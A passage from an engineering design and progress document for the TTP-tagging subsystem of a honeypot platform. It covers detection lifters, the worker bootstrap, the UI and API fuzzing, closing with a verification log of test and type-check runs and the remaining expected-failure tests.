   at `./rules/ttp/`. Each rule lands with its precision-target
   test per Appendix C in the same commit. The corpus for
   precision testing comes from a labelled holdout fixture under
   `tests/ttp/rule_precision/corpus/` — that fixture is itself a
   sub-step (commit) before any rule lands. ✅ done. Cohorts shipped
   in 6 commits: corpus+harness, then command (R0001–R0030),
   behavioral (R0031–R0040), email (R0041–R0048), canary
   (R0049–R0053), intel (R0054–R0058). Live precision asserts on
   R0007–R0029 (regex-on-payload-field). Lifter-bound rules
   (R0001–R0006, R0030, R0031–R0058) are inert under the v0 engine
   by design — their YAMLs declare technique mappings the
   E.3.9–E.3.13 lifters consume by `rule_id`, with each precision
   case `xfail(strict=True)`-gated on the matching lifter step.
   R0058 emits at confidence 0.0 (bump-only meta-rule; repository
   drops sub-0.3 anyway). The corpus extractor lives at
   `tests/ttp/rule_precision/_build_corpus.py`; operator-built
   corpora are gitignored, only synthetic `seed_*.jsonl` is
   committed.
9. **BehavioralLifter** — read `AttackerBehavior` /
   `Credential` / `CredentialReuse`, emit per Appendix A behavior
   tables. Tests in `test_lifter_absence.py` and a new
   `test_behavioral_lifter.py` green. ✅ done. Prerequisite refactor:
   dispatch index pulled into `decnet/ttp/impl/_rule_index.py`
   (`RuleIndex`); state helpers into `decnet/ttp/impl/_state.py`. Each
   lifter holds its own `RuleIndex` watching the same `RuleStore` —
   the `subscribe_changes()` multi-subscriber fan-out (already
   supported by both backends) means operator disable / clip / TTL
   reaches lifter-bound rules through the same atomic-swap path the
   engine uses, not a future composite-rebuild compromise. Lifter
   ownership keyed on `match.kind` prefix `lifter:<owner>_`; YAMLs
   normalised in a separate refactor commit.
10. **IntelLifter** — read `AttackerIntel`, emit per Appendix A.10.
    Per-provider null tolerance tests green. ✅ done. Per-provider
    technique fan-out (AbuseIPDB categories → techniques, GreyNoise
    classification + tags, Feodo, ThreatFox IOC types) lives in code
    with the YAML carrying the universe of possible emits; the
    predicate selects the firing subset and scales confidence by
    `score / 100` for AbuseIPDB. R0058 aggregate-bump is a no-op in
    v0 (cross-tag bump deferred to E.3.14 worker bootstrap).
11. **CanaryFingerprintLifter** — parse fingerprint payload,
    evaluate against derivation rules per Appendix A.9. ✅ done.
    Evidence shape pinned to `CanaryFingerprintEvidence` (`metric` +
    `matched_signature`); raw fingerprint blobs explicitly NOT
    carried. The composite `fp.id` hash matching across IPs stays an
    identity-merge signal upstream, NOT a TTP — preserved.
12. **EmailLifter** — full SMTP message parser + header / body /
    attachment evaluators per Appendix A.6. Largest single impl
    step; consider splitting along header / body / attachment lines
    if the diff balloons past ~600 lines. ✅ done (single commit;
    diff stayed under threshold). PII discipline enforced at the
    lifter layer via `_filter_evidence()`: emitted evidence is
    restricted to the EmailEvidence allowlist + PII-safe match
    discriminators. Raw addresses, raw body bytes, full URLs, and
    decoded base64 previews never appear in evidence — defense-in-
    depth over the YAML `evidence_fields` hint. R0042 mass-phish
    requires `body_simhash` (campaign signal); high-RCPT alone is
    open-relay (R0041) territory.
13. **IdentityLifter + CredentialLifter** — cross-Attacker rollups.
    Bus-wake on `identity.formed` / `identity.merged` /
    `credential.reuse.detected`. ✅ done. IdentityLifter owns
    `lifter:identity_*` (R0003 password spraying); CredentialLifter
    owns `lifter:credential_*` (R0001 generic auth brute, R0002
    password guessing, R0004 reuse, R0005 valid-account use, R0006
    default credentials). Identity-rollup tags null `attacker_uuid`
    on emit so the worked-example invariant holds. R0001/R0002/R0005/
    R0006 YAML kinds were normalised to the `lifter:credential_`
    prefix in this commit (the doc-promised "YAMLs normalised in a
    separate refactor commit" lands here, not in E.3.9).
14. **Worker bootstrap** — wire up the loop, the
    `CompositeTagger`, the bus subscriptions, the `RuleEngine`
    watching the `RuleStore`. `test_worker_bus.py` green
    end-to-end. ✅ done. Inner loop drains a per-process queue
    populated by one pump task per topic, dispatches each event
    through `CompositeTagger.tag()`, persists via
    `repo.insert_tags()` (which already drops sub-0.3 confidence
    and ON-CONFLICT-DO-NOTHING via the dialect hook), and
    publishes `ttp.tagged` plus per-technique `ttp.rule.fired.*`
    only when the insert returned a non-zero rowcount —
    enforcing the loop-prevention invariant. CompositeTagger
    seeded with all six lifters (Behavioral, Intel,
    CanaryFingerprint, Email, Identity, Credential). The
    intel-catch-up via `attacker.session.ended` is intentionally
    deferred to E.3.14b — today the worker is 1:1 source-kind →
    lifter; the catch-up rewrite needs a session→intel join the
    repo doesn't expose yet.
    Worker registration: `decnet ttp` CLI command lands in
    `decnet/cli/workers.py` (master-only, gated through
    `MASTER_ONLY_COMMANDS` in `decnet/cli/gating.py`); the
    rendered systemd unit at `deploy/decnet-ttp.service.j2`
    sits one layer above the identity / intel / reuse-correlator
    workers via `After=` deps and is included in
    `deploy/decnet.target`. `ProtectHome=read-only` suffices —
    FilesystemRuleStore only reads `./rules/ttp/`.
15. **UKC bridge** — implement `tactic_to_ukc_phase` and inverse.
    Rewrite the campaign clusterer's
    `IdentityFeatures.commands_by_phase_on_decky` adapter to read
    from `ttp_tag`. Validate that production phase-handoff edge
    weights now fire (previously dormant — the phase-handoff
    test's `xfail` flips to `xpass`, which is the moment we know
    this whole project paid off). ✅ done.
    `tactic_to_ukc_phase` + `OBSERVABLE_PHASES` were already
    shipped in earlier work — this step adds
    `BaseRepository.list_ttp_decky_phases(identity_uuid)` and
    rewrites `from_identity_row()` to populate the four
    phase-handoff maps (`first_phase_per_decky`,
    `last_phase_per_decky`, `first_seen_per_decky`,
    `last_seen_per_decky`) from real `ttp_tag` rows.
    `commands_by_phase_on_decky` itself stays empty on the
    production path — the phase-handoff edge does not consume
    it; the four phase-maps drive the F5 signal. Synthetic
    fixtures continue to populate the commands map directly.
    `tests/clustering/test_ttp_phase_handoff.py` pins the
    production-row pair clearing `CAMPAIGN_EDGE_THRESHOLD` —
    the trip-wire that says the whole project paid off.
16. **Frontend** — `IdentityDetail` "TTPs Observed" section,
    `AttackerDetail` per-IP slice, Navigator export buttons,
    rule-state controls (disable / clip / TTL) backed by the
    `set_state()` API. UI smoke tests via the existing dev-server
    flow per project convention. ✅ done.
    `TTPsObservedSection.tsx` is the shared analyst-facing
    component (scope=`identity`|`attacker`); the Identity scope
    carries the Navigator export button. `RuleStateControls.tsx`
    is the admin-only operational panel — server-gated by
    `require_admin` AND client-gated on `/config?.role` so a
    non-admin never sees the controls. Wired into Config.tsx as
    a new "TTP RULES" admin tab. Empty state literal "NO
    TECHNIQUES OBSERVED YET" per the design doc — no spinner.
    `tsc --noEmit` + `vite build` clean.
17. **Schemathesis pass** — full API fuzz including the new TTP
    routes. Document any new 4xx codes per the project's
    "POST/PUT/PATCH 400" convention. ✅ done.
    `POST /ttp/rules/{rule_id}/state` already documents 400
    (manual-parse for malformed JSON, per
    `feedback_schemathesis_400.md`); the GET rollups
    (by-identity / by-attacker / by-campaign / by-session /
    techniques / rules / export-navigator{,/identity})
    uniformly document 401 + 403 per the auth-gated convention.
    `wiki-checkout/Service-Bus.md` updated to flip the TTP
    worker topics from "_reserved (TTP worker)_" to actual
    publisher attribution (`decnet.ttp.worker`) now that the
    worker bootstrap publishes them. Suppression-event publish
    stays deferred per the v0 contract — the repo drops
    sub-floor confidence directly, no bus event.

### E.4 Out-of-band tasks (not gated on the above)

These can land in parallel without blocking the main path:

- **Backfill CLI** — `decnet ttp backfill --since N days` walks
  `attacker_command` / `email` / `canary_event` history and runs
  the worker over each row. Shipped post-v0 worker-online.
- **Provider mapping review** — schedule a quarterly DEBT.md item
  to re-walk AbuseIPDB / GreyNoise / ThreatFox catalogues for new
  categories.
- **Sigma adapter** — separate engine; lands when v0 ships and the
  precision targets are stable.

### E.5 Stop conditions

The CDD plan declares the design phase complete when:

1. Every contract file from §E.1 exists and compiles.
2. Every test from §E.2 exists, runs, and produces a deterministic
   PASS or FAIL (no flakes).
3. The test suite communicates the *intended behavior* clearly
   enough that a stranger reading only `tests/ttp/` could
   reconstruct the design from the assertions.

If condition 3 fails — if a future contributor reads the tests
and is confused about what the system is supposed to do — that is
a doc bug, not a test bug, and TTP_TAGGING.md gets the update,
not the test file.

## E.5 verification log — 2026-05-02

Run by ANTI on `dev` after E.3.18a/b/c (worker hydrates per-lifter
indexes via `watch_store`, session→command fan-out, `RuleEngineTagger`
wired into the composite) and E.4.a/b/c (`decnet ttp-backfill` CLI,
DEBT.md quarterly provider review + Sigma post-v1 entry).

### Condition 1 — every §E.1 contract file exists and compiles

| § | Path | exists | compileall |
|---|------|:-:|:-:|
| E.1.1 | `decnet/web/db/models/ttp.py` | ✅ | ✅ |
| E.1.2 | `decnet/bus/topics.py` | ✅ | ✅ |
| E.1.3 | `decnet/ttp/base.py` | ✅ | ✅ |
| E.1.4 | `decnet/ttp/factory.py` | ✅ | ✅ |
| E.1.5 | `decnet/ttp/impl/rule_engine.py` | ✅ | ✅ |
| E.1.6 | `decnet/ttp/impl/{behavioral,intel,email,canary_fingerprint,identity,credential}_lifter.py` | ✅ | ✅ |
| E.1.7 | `decnet/ttp/worker.py` | ✅ | ✅ |
| E.1.8 | `decnet/clustering/ukc.py` | ✅ | ✅ |
| E.1.9 | `decnet/web/router/ttp/api_*.py` (7 files) | ✅ | ✅ |
| E.1.10 | `decnet/web/db/sqlmodel_repo/ttp.py` | ✅ | ✅ |
| E.1.11 | `decnet/ttp/store/{base,factory}.py`, `decnet/ttp/store/impl/{filesystem,database}.py` | ✅ | ✅ |

### Condition 2 — targeted suite is deterministic

```
pytest tests/ttp/ tests/api/ttp/ tests/bus/test_ttp_topics.py \
       tests/web/db/test_ttp_repo.py tests/clustering/test_ukc_bridge.py \
       --timeout=30 --timeout-method=thread -q
→ 604 passed, 1 skipped, 10 xfailed, 25 warnings in 16.22s
```

Strict mypy over the full TTP surface:

```
.311/bin/mypy decnet/ttp/ decnet/cli/ttp.py decnet/cli/workers.py \
              decnet/web/router/ttp/ decnet/web/db/sqlmodel_repo/ttp.py \
              --ignore-missing-imports --no-error-summary
→ clean
```

Open xfails (all `xfail(strict=True)`, all reference the design phase
they unblock; intentional carry-overs, not flakes):

| File | Test | Reason |
|------|------|--------|
| `tests/ttp/test_evidence_shape.py` | `test_lifter_emits_evidence_matching_typeddict[command-BehavioralLifter-CommandEvidence]` | impl phase E.3.x: lifters return `[]` today (xfail flips when behavioral evidence shapes solidify) |
| `tests/ttp/test_evidence_shape.py` | `[intel-IntelLifter-IntelEvidence]` | same — IntelLifter evidence shape |
| `tests/ttp/test_evidence_shape.py` | `[email-EmailLifter-EmailEvidence]` | same — EmailLifter evidence shape |
| `tests/ttp/test_evidence_shape.py` | `[canary_fingerprint-CanaryFingerprintLifter-CanaryFingerprintEvidence]` | same — CanaryFingerprintLifter evidence shape |
| `tests/ttp/test_evidence_shape.py` | `test_evidence_shape_violation_propagates_as_typeerror` | impl phase: `TolerantTagger` currently swallows `TypeError` |
| `tests/ttp/test_confidence.py` | `test_abuseipdb_score_30_dropped` | impl phase E.3.10 — provider-score multiplier in the IntelLifter |
| `tests/ttp/test_tracing.py` | `test_lifter_child_spans_emitted` | impl phase E.3.9–E.3.13 — per-lifter `ttp.lifter.{name}` child spans |
| `tests/ttp/test_tracing.py` | `test_no_pii_canary_in_span_attributes` | impl phase E.3.7+ — assert across the battery once spans are produced |
| `tests/ttp/test_worker_bus.py` | `test_dropped_intel_enriched_still_produces_intel_tags` | design-deferred to E.3.14b — catch-up via `attacker.session.ended` |
| `tests/ttp/test_schema.py` | `test_confidence_outside_range_rejected_at_insert` | impl phase: confidence-range guard not yet enforced at the repo |

### Condition 3 — stranger-readability

Spot check on `tests/ttp/`: every test file opens with a docstring
referencing the §E.x section it pins, and every `xfail(strict=True)`
marker carries a `reason=` that names the impl step that flips it
(see the table above — the reasons grep cleanly out of the markers).
A contributor reading only `tests/ttp/` can reconstruct the design
intent at the level the design doc commits to. No doc bugs surfaced
during this pass.

### Closing statement

The design phase (E.1 contracts + E.2 tests) and the implementation
phase (E.3.1–E.3.18) are closed out. The pre-E.4 wiring gaps that
made the rule pack inert in production (see E.3.18a/b/c above) are
fixed; `decnet ttp-backfill` ships for historical replay; DEBT.md
carries the quarterly provider-review reminder and the Sigma
post-v1 trigger.

The next operational phase is rule-precision tuning against live
honeypot data, tracked outside this document.

